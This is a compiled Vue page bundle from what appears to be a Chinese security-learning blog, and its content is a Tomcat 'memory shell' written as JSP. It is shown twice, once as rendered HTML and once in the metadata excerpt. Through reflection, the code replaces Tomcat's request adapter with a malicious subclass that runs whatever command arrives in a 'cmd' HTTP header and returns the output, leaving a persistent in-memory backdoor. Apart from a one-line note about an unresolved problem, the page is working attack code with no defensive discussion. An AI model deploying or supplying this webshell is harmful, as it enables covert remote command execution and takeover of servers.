import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as i}from"./app-DS0ZCcmM.js";const p={};function l(c,n){return i(),a("div",null,n[0]||(n[0]=[e(`<h1 id="adapter" tabindex="-1"><a class="header-anchor" href="#adapter"><span>Adapter</span></a></h1><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.connector.CoyoteAdapter&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.coyote.http11.Http11Processor&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.connector.Connector&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioEndpoint&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioChannel&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.util.Set&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%!</span></span>
<span class="line"><span>    public static void setFiled(Object object, Class clazz, String filed_Name, Object value) {</span></span>
<span class="line"><span>    Field flied = null;</span></span>
<span class="line"><span>    try {</span></span>
<span class="line"><span>    flied = clazz.getDeclaredField(filed_Name);</span></span>
<span class="line"><span>    flied.setAccessible(true);</span></span>
<span class="line"><span>    flied.set(object, value);</span></span>
<span class="line"><span>    } catch (NoSuchFieldException e) {</span></span>
<span class="line"><span>    throw new RuntimeException(e);</span></span>
<span class="line"><span>    } catch (IllegalAccessException e) {</span></span>
<span class="line"><span>    throw new RuntimeException(e);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>    public static Object getField(Object object, Class clazz, String fieldName) {</span></span>
<span class="line"><span>        Field declaredField;</span></span>
<span class="line"><span>        try {</span></span>
<span class="line"><span>            declaredField = clazz.getDeclaredField(fieldName);</span></span>
<span class="line"><span>            declaredField.setAccessible(true);</span></span>
<span class="line"><span>            return declaredField.get(object);</span></span>
<span class="line"><span>        } catch (NoSuchFieldException e) {</span></span>
<span class="line"><span>        } catch (IllegalAccessException e) {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        return null;</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>    public static Object getHttp11Processor() {</span></span>
<span class="line"><span>        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();</span></span>
<span class="line"><span>        Thread threads[] = (Thread[]) getField(threadGroup, threadGroup.getClass(), &quot;threads&quot;);</span></span>
<span class="line"><span>        for(Thread thread:threads){</span></span>
<span class="line"><span>            Object o=getField(thread, thread.getClass(), &quot;target&quot;);</span></span>
<span class="line"><span>            if(null!=o&amp;&amp;o instanceof  NioEndpoint.Poller){</span></span>
<span class="line"><span>                NioEndpoint.Poller target=( NioEndpoint.Poller)o;</span></span>
<span class="line"><span>                NioEndpoint nioEndpoint = (NioEndpoint) getField(target, target.getClass(), &quot;this$0&quot;);</span></span>
<span class="line"><span>                Set&lt;SocketWrapperBase&lt;NioChannel&gt;&gt; connections = nioEndpoint.getConnections();</span></span>
<span class="line"><span>                for (SocketWrapperBase&lt;NioChannel&gt; c : connections) {</span></span>
<span class="line"><span>                    Object currentProcessor = c.getCurrentProcessor();</span></span>
<span class="line"><span>                    if (null != currentProcessor) {</span></span>
<span class="line"><span>                        return currentProcessor;</span></span>
<span class="line"><span>                    }</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        return new Object();</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%!</span></span>
<span class="line"><span>public class MyAdapter extends CoyoteAdapter {</span></span>
<span class="line"><span></span></span>
<span class="line"><span>public MyAdapter(Connector connector) {</span></span>
<span class="line"><span>super(connector);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>public void exec(String p, org.apache.coyote.Response res) {</span></span>
<span class="line"><span>try {</span></span>
<span class="line"><span>    Runtime rt = Runtime.getRuntime();</span></span>
<span class="line"><span>    Process process = rt.exec(p);</span></span>
<span class="line"><span>    java.io.InputStream in = process.getInputStream();</span></span>
<span class="line"><span>    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span>
<span class="line"><span>    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span>
<span class="line"><span>    String s = &quot;&quot;;</span></span>
<span class="line"><span>    String tmp = &quot;&quot;;</span></span>
<span class="line"><span>    while ((tmp = stdInput.readLine()) != null) {</span></span>
<span class="line"><span>        s += tmp;</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>    byte[] result = new byte[0];</span></span>
<span class="line"><span>    if (s != &quot;&quot;) {</span></span>
<span class="line"><span>        result = s.getBytes(StandardCharsets.UTF_8);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>    res.doWrite(ByteBuffer.wrap(result));</span></span>
<span class="line"><span>} catch (Exception e) {</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>@Override</span></span>
<span class="line"><span>public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {</span></span>
<span class="line"><span>System.out.println(&quot;success !&quot;);</span></span>
<span class="line"><span>String p = req.getHeader(&quot;cmd&quot;);</span></span>
<span class="line"><span>if(null!=p){</span></span>
<span class="line"><span>exec(p, res);</span></span>
<span class="line"><span>}else {</span></span>
<span class="line"><span>//调用父类service方法</span></span>
<span class="line"><span>super.service(req, res);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    Http11Processor http11Processor = (Http11Processor) getHttp11Processor();</span></span>
<span class="line"><span>    CoyoteAdapter adapter = (CoyoteAdapter) http11Processor.getAdapter();</span></span>
<span class="line"><span>    Connector connector = (Connector) getField(adapter, adapter.getClass(), &quot;connector&quot;);</span></span>
<span class="line"><span>    MyAdapter adapterMem = new MyAdapter(connector);</span></span>
<span class="line"><span>    setFiled(http11Processor, http11Processor.getClass().getSuperclass(), &quot;adapter&quot;, adapterMem);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716150520660.png" alt="image-20240716150520660" tabindex="0" loading="lazy"><figcaption>image-20240716150520660</figcaption></figure><p>记录一下问题，暂时没搞清楚是什么原因</p>`,4)]))}const d=s(p,[["render",l],["__file","Adapter.html.vue"]]),v=JSON.parse('{"path":"/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Adapter.html","title":"Adapter","lang":"zh-CN","frontmatter":{"description":"Adapter image-20240716150520660image-20240716150520660 记录一下问题，暂时没搞清楚是什么原因","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Adapter.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Adapter"}],["meta",{"property":"og:description","content":"Adapter image-20240716150520660image-20240716150520660 记录一下问题，暂时没搞清楚是什么原因"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716150520660.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Adapter\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716150520660.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":1.1,"words":329},"filePathRelative":"Java学习/内存马/Tomcat/Adapter.md","localizedDate":"2025年1月16日","excerpt":"\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.catalina.connector.CoyoteAdapter\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.coyote.http11.Http11Processor\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.catalina.connector.Connector\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"java.lang.reflect.Field\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.tomcat.util.net.NioEndpoint\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.tomcat.util.net.NioChannel\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"org.apache.tomcat.util.net.SocketWrapperBase\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"java.util.Set\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"java.nio.ByteBuffer\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page import=\\"java.nio.charset.StandardCharsets\\" %&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%@ page contentType=\\"text/html;charset=UTF-8\\" language=\\"java\\" %&gt;</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>&lt;%!</span></span>\\n<span class=\\"line\\"><span>    public static void setFiled(Object object, Class clazz, String filed_Name, Object value) {</span></span>\\n<span class=\\"line\\"><span>    Field flied = null;</span></span>\\n<span class=\\"line\\"><span>    try {</span></span>\\n<span class=\\"line\\"><span>    flied = clazz.getDeclaredField(filed_Name);</span></span>\\n<span class=\\"line\\"><span>    flied.setAccessible(true);</span></span>\\n<span class=\\"line\\"><span>    flied.set(object, value);</span></span>\\n<span class=\\"line\\"><span>    } catch (NoSuchFieldException e) {</span></span>\\n<span class=\\"line\\"><span>    throw new RuntimeException(e);</span></span>\\n<span class=\\"line\\"><span>    } catch (IllegalAccessException e) {</span></span>\\n<span class=\\"line\\"><span>    throw new RuntimeException(e);</span></span>\\n<span class=\\"line\\"><span>    }</span></span>\\n<span class=\\"line\\"><span>    }</span></span>\\n<span class=\\"line\\"><span>    public static Object getField(Object object, Class clazz, String fieldName) {</span></span>\\n<span class=\\"line\\"><span>        Field declaredField;</span></span>\\n<span class=\\"line\\"><span>        try {</span></span>\\n<span class=\\"line\\"><span>            declaredField = clazz.getDeclaredField(fieldName);</span></span>\\n<span class=\\"line\\"><span>            declaredField.setAccessible(true);</span></span>\\n<span class=\\"line\\"><span>            return declaredField.get(object);</span></span>\\n<span class=\\"line\\"><span>        } catch (NoSuchFieldException e) {</span></span>\\n<span class=\\"line\\"><span>        } catch (IllegalAccessException e) {</span></span>\\n<span class=\\"line\\"><span>        }</span></span>\\n<span class=\\"line\\"><span>        return null;</span></span>\\n<span class=\\"line\\"><span>    }</span></span>\\n<span class=\\"line\\"><span>    public static Object getHttp11Processor() {</span></span>\\n<span class=\\"line\\"><span>        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();</span></span>\\n<span class=\\"line\\"><span>        Thread threads[] = (Thread[]) getField(threadGroup, threadGroup.getClass(), \\"threads\\");</span></span>\\n<span class=\\"line\\"><span>        for(Thread thread:threads){</span></span>\\n<span class=\\"line\\"><span>            Object o=getField(thread, thread.getClass(), \\"target\\");</span></span>\\n<span class=\\"line\\"><span>            if(null!=o&amp;&amp;o instanceof  NioEndpoint.Poller){</span></span>\\n<span class=\\"line\\"><span>                NioEndpoint.Poller target=( NioEndpoint.Poller)o;</span></span>\\n<span class=\\"line\\"><span>                NioEndpoint nioEndpoint = (NioEndpoint) getField(target, target.getClass(), \\"this$0\\");</span></span>\\n<span class=\\"line\\"><span>                Set&lt;SocketWrapperBase&lt;NioChannel&gt;&gt; connections = nioEndpoint.getConnections();</span></span>\\n<span class=\\"line\\"><span>                for (SocketWrapperBase&lt;NioChannel&gt; c : connections) {</span></span>\\n<span class=\\"line\\"><span>                    Object currentProcessor = c.getCurrentProcessor();</span></span>\\n<span class=\\"line\\"><span>                    if (null != currentProcessor) {</span></span>\\n<span class=\\"line\\"><span>                        return currentProcessor;</span></span>\\n<span class=\\"line\\"><span>                    }</span></span>\\n<span class=\\"line\\"><span>                }</span></span>\\n<span class=\\"line\\"><span>            }</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>        }</span></span>\\n<span class=\\"line\\"><span>        return new Object();</span></span>\\n<span class=\\"line\\"><span>    }</span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>&lt;%!</span></span>\\n<span class=\\"line\\"><span>public class MyAdapter extends CoyoteAdapter {</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>public MyAdapter(Connector connector) {</span></span>\\n<span class=\\"line\\"><span>super(connector);</span></span>\\n<span class=\\"line\\"><span>}</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>public void exec(String p, org.apache.coyote.Response res) {</span></span>\\n<span class=\\"line\\"><span>try {</span></span>\\n<span class=\\"line\\"><span>    Runtime rt = Runtime.getRuntime();</span></span>\\n<span class=\\"line\\"><span>    Process process = rt.exec(p);</span></span>\\n<span class=\\"line\\"><span>    java.io.InputStream in = process.getInputStream();</span></span>\\n<span class=\\"line\\"><span>    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span>\\n<span class=\\"line\\"><span>    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span>\\n<span class=\\"line\\"><span>    String s = \\"\\";</span></span>\\n<span class=\\"line\\"><span>    String tmp = \\"\\";</span></span>\\n<span class=\\"line\\"><span>    while ((tmp = stdInput.readLine()) != null) {</span></span>\\n<span class=\\"line\\"><span>        s += tmp;</span></span>\\n<span class=\\"line\\"><span>    }</span></span>\\n<span class=\\"line\\"><span>    byte[] result = new byte[0];</span></span>\\n<span class=\\"line\\"><span>    if (s != \\"\\") {</span></span>\\n<span class=\\"line\\"><span>        result = s.getBytes(StandardCharsets.UTF_8);</span></span>\\n<span class=\\"line\\"><span>    }</span></span>\\n<span class=\\"line\\"><span>    res.doWrite(ByteBuffer.wrap(result));</span></span>\\n<span class=\\"line\\"><span>} catch (Exception e) {</span></span>\\n<span class=\\"line\\"><span>}</span></span>\\n<span class=\\"line\\"><span>}</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>@Override</span></span>\\n<span class=\\"line\\"><span>public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {</span></span>\\n<span class=\\"line\\"><span>System.out.println(\\"success !\\");</span></span>\\n<span class=\\"line\\"><span>String p = req.getHeader(\\"cmd\\");</span></span>\\n<span class=\\"line\\"><span>if(null!=p){</span></span>\\n<span class=\\"line\\"><span>exec(p, res);</span></span>\\n<span class=\\"line\\"><span>}else {</span></span>\\n<span class=\\"line\\"><span>//调用父类service方法</span></span>\\n<span class=\\"line\\"><span>super.service(req, res);</span></span>\\n<span class=\\"line\\"><span>}</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span>}</span></span>\\n<span class=\\"line\\"><span>}</span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span>\\n<span class=\\"line\\"><span>&lt;%</span></span>\\n<span class=\\"line\\"><span>    Http11Processor http11Processor = (Http11Processor) getHttp11Processor();</span></span>\\n<span class=\\"line\\"><span>    CoyoteAdapter adapter = (CoyoteAdapter) http11Processor.getAdapter();</span></span>\\n<span class=\\"line\\"><span>    Connector connector = (Connector) getField(adapter, adapter.getClass(), \\"connector\\");</span></span>\\n<span class=\\"line\\"><span>    MyAdapter adapterMem = new MyAdapter(connector);</span></span>\\n<span class=\\"line\\"><span>    setFiled(http11Processor, http11Processor.getClass().getSuperclass(), \\"adapter\\", adapterMem);</span></span>\\n<span class=\\"line\\"><span>%&gt;</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{d as comp,v as data};
